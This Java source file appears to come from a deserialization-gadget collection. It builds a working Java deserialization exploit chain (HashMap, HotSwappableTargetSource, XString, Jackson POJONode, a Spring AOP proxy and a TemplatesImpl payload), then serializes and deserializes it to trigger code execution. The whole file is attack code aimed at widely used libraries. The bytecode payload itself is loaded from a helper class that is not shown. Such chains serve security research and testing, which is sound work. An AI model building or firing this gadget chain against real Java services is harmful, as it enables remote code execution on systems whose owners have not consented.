package org.example.gadget;

import com.alibaba.fastjson.JSONArray;
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.springframework.aop.target.HotSwappableTargetSource;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.util.HashMap;

import static org.example.CommonUtils.*;

public class HashMap2HSTS2XString2toString {
    public static void main(String[] args) throws Exception{
        TemplatesImpl tpl1 = TemplateImplWithoutAbstractTranslet.getPayload(null);
        rmJacksonWriteReplace();
        POJONode pojoNode = new POJONode(getJdkDynamicAopProxy(tpl1));

        HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(pojoNode);
        HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(new XString("1"));
        HashMap hashMap = makeMap(hotSwappableTargetSource1, hotSwappableTargetSource2);

        byte[] bytes = serialize(hashMap);
        unserialize(bytes);
    }

    public static HashMap<Object, Object> makeMap (Object v1, Object v2 )
            throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class,
                Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);
        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setFieldValue(s, "table", tbl);
        return s;
    }


}
